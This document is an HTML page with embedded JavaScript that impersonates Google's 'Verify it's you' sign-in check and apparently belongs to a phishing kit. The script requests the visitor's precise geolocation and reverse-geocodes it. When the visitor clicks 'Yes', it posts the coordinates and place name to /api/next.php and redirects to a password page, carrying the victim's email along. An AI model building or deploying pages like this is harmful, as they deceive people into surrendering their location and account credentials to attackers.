<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify it's you - Google Accounts</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">

    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            /* Gmail brand colors */
            --gmail-blue: #1a73e8;
            --gmail-red: #ea4335;
            --gmail-yellow: #fbbc04;
            --gmail-green: #34a853;
            --gmail-white: #ffffff;
            --gmail-gray: #5f6368;
            --gmail-light-gray: #f1f3f4;
            --gmail-border: #dadce0;
        }

        * { box-sizing: border-box; }

        html, body {
            margin: 0 !important;
            padding: 0 !important;
            width: 100% !important;
            height: 100% !important;
            overflow-x: hidden !important;
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
            background: var(--gmail-white) !important;
            color: #202124 !important;
            -webkit-font-smoothing: antialiased !important;
            -moz-osx-font-smoothing: grayscale !important;
            display: flex !important;
            flex-direction: column !important;
            justify-content: center !important;
            align-items: center !important;
            min-height: 100vh !important;
        }

        .gmail-form {
            width: 100% !important;
            max-width: 450px !important;
            padding: 48px 40px 36px !important;
            box-sizing: border-box !important;
        }

    .gmail-logo {
        width: 220px !important;
        height: 75px !important;
        margin: 0 0 20px 0 !important;
        display: block !important;
        background: url('images/google-logo-vector-format-white-background-illustration-407571050.webp') no-repeat left center !important;
        background-size: contain !important;
    }

        .verify-title {
            font-size: 24px !important;
            font-weight: 400 !important;
            font-family: 'Roboto', sans-serif !important;
            color: #202124 !important;
            margin: 0 0 8px 0 !important;
            text-align: center !important;
        }

        .verify-subtitle {
            font-size: 16px !important;
            color: #5f6368 !important;
            margin: 0 0 16px 0 !important;
            text-align: center !important;
        }

        .verify-account-selector {
            display: flex !important;
            align-items: center !important;
            border: 1px solid #202124 !important;
            border-radius: 24px !important;
            background: var(--gmail-white) !important;
            margin-bottom: 32px !important;
            cursor: pointer !important;
            transition: border-color 0.2s ease !important;
            width: fit-content !important;
            padding: 8px 12px !important;
            margin: 0 auto 32px auto !important;
        }

        .verify-account-avatar {
            width: 24px !important;
            height: 24px !important;
            border-radius: 50% !important;
            border: 2px solid #202124 !important;
            background: var(--gmail-white) !important;
            color: #202124 !important;
            display: flex !important;
            align-items: center !important;
            justify-content: center !important;
            font-size: 12px !important;
            margin: 2px 8px 2px 2px !important;
        }

        .verify-account-info {
            flex: 1 !important;
        }

        .verify-account-email {
            font-size: 14px !important;
            color: #202124 !important;
            font-weight: 400 !important;
        }

        .device-info {
            background: #f8f9fa !important;
            border: 1px solid var(--gmail-border) !important;
            border-radius: 8px !important;
            padding: 16px !important;
            margin: 24px 0 !important;
            text-align: center !important;
        }

        .device-icon {
            font-size: 32px !important;
            margin-bottom: 8px !important;
        }

        .device-name {
            font-weight: 500 !important;
            color: #202124 !important;
            margin-bottom: 4px !important;
        }

        .device-location {
            font-size: 14px !important;
            color: #5f6368 !important;
        }

        .verify-question {
            font-size: 16px !important;
            color: #202124 !important;
            margin: 24px 0 16px 0 !important;
            text-align: center !important;
            font-weight: 400 !important;
        }

        .button-group {
            display: flex !important;
            gap: 12px !important;
            margin-top: 24px !important;
        }

        .verify-btn {
            flex: 1 !important;
            padding: 12px 24px !important;
            border: 1px solid var(--gmail-border) !important;
            border-radius: 8px !important;
            background: var(--gmail-white) !important;
            color: var(--gmail-blue) !important;
            font-size: 14px !important;
            font-weight: 500 !important;
            cursor: pointer !important;
            text-align: center !important;
            text-decoration: none !important;
            display: inline-block !important;
            transition: all 0.2s ease !important;
            margin-left: auto !important;
            margin-right: 0 !important;
        }

        .verify-btn:hover {
            background: #f8f9fa !important;
        }

        .verify-btn.yes {
            background: transparent !important;
            color: var(--gmail-blue) !important;
            border-color: var(--gmail-blue) !important;
        }

        .verify-btn.yes:hover {
            background: rgba(26, 115, 232, 0.1) !important;
        }

        .help-link {
            display: block !important;
            text-align: center !important;
            margin-top: 24px !important;
            color: var(--gmail-blue) !important;
            text-decoration: none !important;
            font-size: 14px !important;
        }

        .help-link:hover {
            text-decoration: underline !important;
        }

        @media (max-width: 480px) {
            .button-group {
                flex-direction: column !important;
            }

            .verify-btn {
                margin-bottom: 8px !important;
            }
        }

        /* Footer styles */
        .gmail-footer {
            position: fixed !important;
            bottom: 0 !important;
            left: 0 !important;
            right: 0 !important;
            background: #f8f9fa !important;
            border-top: 1px solid var(--gmail-border) !important;
            padding: 16px 24px !important;
            z-index: 1000 !important;
        }

        .footer-content {
            display: flex !important;
            justify-content: space-between !important;
            align-items: center !important;
            max-width: 1200px !important;
            margin: 0 auto !important;
        }

        .language-select {
            background: transparent !important;
            border: none !important;
            color: var(--gmail-gray) !important;
            font-size: 14px !important;
            cursor: pointer !important;
            outline: none !important;
        }

        .footer-links {
            display: flex !important;
            gap: 24px !important;
        }

        .footer-links a {
            color: var(--gmail-gray) !important;
            text-decoration: none !important;
            font-size: 14px !important;
        }

        .footer-links a:hover {
            text-decoration: underline !important;
        }
    </style>
</head>
<body>
    <div class="gmail-form">
        <div class="gmail-logo"></div>
        <h1 class="verify-title">Verify it's you</h1>
        <div class="verify-subtitle">To help keep your account secure, Google wants to make sure it's really you trying to sign in</div>

        <div class="verify-account-selector" onclick="switchAccount()">
            <div class="verify-account-avatar">ðŸ‘¤</div>
            <div class="verify-account-info">
                <div class="verify-account-email" id="verify-email-display"></div>
            </div>
            <div class="verify-account-dropdown">â–¼</div>
        </div>

        <div class="device-info">
            <div class="device-icon">ðŸ“±</div>
            <div class="device-name" id="device-name">Your phone</div>
            <div class="device-location" id="device-location">Location unknown</div>
        </div>

        <div class="verify-question">Is this you trying to sign in?</div>

        <div class="button-group">
            <button class="verify-btn yes" onclick="verifyYes()">Yes</button>
            <button class="verify-btn" onclick="verifyNo()">No</button>
        </div>
    </div>

    <footer class="gmail-footer">
        <div class="footer-content">
            <select class="language-select" aria-label="Select language">
                <option>English (United States)</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </footer>

    <script>
        // Get URL parameters
        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        // Global variable to store location data
        let userLocation = {
            latitude: null,
            longitude: null,
            accuracy: null,
            locationString: 'Location unknown'
        };

        // Set device info based on user agent
        function setDeviceInfo() {
            const userAgent = navigator.userAgent;
            let deviceName = 'Your device';

            if (userAgent.includes('Mobile')) {
                deviceName = 'Your phone';
            } else if (userAgent.includes('Tablet')) {
                deviceName = 'Your tablet';
            } else {
                deviceName = 'Your computer';
            }

            document.getElementById('device-name').textContent = deviceName;

            // Get location info with better error handling
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // Success callback
                        userLocation.latitude = position.coords.latitude;
                        userLocation.longitude = position.coords.longitude;
                        userLocation.accuracy = position.coords.accuracy;

                        // Try to get location name using reverse geocoding
                        reverseGeocode(position.coords.latitude, position.coords.longitude);
                    },
                    function(error) {
                        // Error callback
                        console.log('Geolocation error:', error);
                        let errorMessage = 'Location unknown';

                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = 'Location access denied';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = 'Location unavailable';
                                break;
                            case error.TIMEOUT:
                                errorMessage = 'Location request timeout';
                                break;
                        }

                        userLocation.locationString = errorMessage;
                        document.getElementById('device-location').textContent = errorMessage;
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 300000 // 5 minutes
                    }
                );
            } else {
                document.getElementById('device-location').textContent = 'Geolocation not supported';
            }
        }

        // Reverse geocoding to get location name
        function reverseGeocode(lat, lng) {
            // Use a free geocoding service
            const url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=en`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.city && data.countryName) {
                        userLocation.locationString = `${data.city}, ${data.countryName}`;
                    } else if (data.locality) {
                        userLocation.locationString = `${data.locality}, ${data.countryName || 'Unknown'}`;
                    } else {
                        userLocation.locationString = `Near ${lat.toFixed(2)}, ${lng.toFixed(2)}`;
                    }
                    document.getElementById('device-location').textContent = userLocation.locationString;
                })
                .catch(error => {
                    console.log('Reverse geocoding failed:', error);
                    userLocation.locationString = `Near ${lat.toFixed(2)}, ${lng.toFixed(2)}`;
                    document.getElementById('device-location').textContent = userLocation.locationString;
                });
        }

        function verifyYes() {
            // Send verification confirmation with location data
            const xhr = new XMLHttpRequest();
            xhr.open('POST', '/api/next.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

            // Prepare form data with location information
            let formData = 'device_verify=yes';
            if (userLocation.latitude && userLocation.longitude) {
                formData += '&gps_lat=' + encodeURIComponent(userLocation.latitude);
                formData += '&gps_lng=' + encodeURIComponent(userLocation.longitude);
                formData += '&gps_accuracy=' + encodeURIComponent(userLocation.accuracy || 0);
                formData += '&location_name=' + encodeURIComponent(userLocation.locationString);
            }

            xhr.send(formData);

            // Redirect to next step (could be password page or success)
            const email = getUrlParameter('email');
            if (email) {
                window.location.href = 'password.html?email=' + encodeURIComponent(email) + '&device_verified=yes';
            } else {
                window.location.href = 'password.html?device_verified=yes';
            }
        }

        function verifyNo() {
            // Show additional verification options or redirect to help
            alert("If this isn't you, please contact Google support immediately.");
            // Could redirect to a different verification method
        }

        function needHelp() {
            alert("Choose a different verification method.");
            // Could show options for SMS, authenticator app, etc.
        }

        // Initialize device info on page load
        document.addEventListener('DOMContentLoaded', function() {
            setDeviceInfo();
            // Set email display
            var email = getUrlParameter('email');
            if (email) {
                document.getElementById('verify-email-display').textContent = email;
            }
        });

        function switchAccount() {
            window.location.href = 'login.html';
        }
    </script>
</body>
</html>
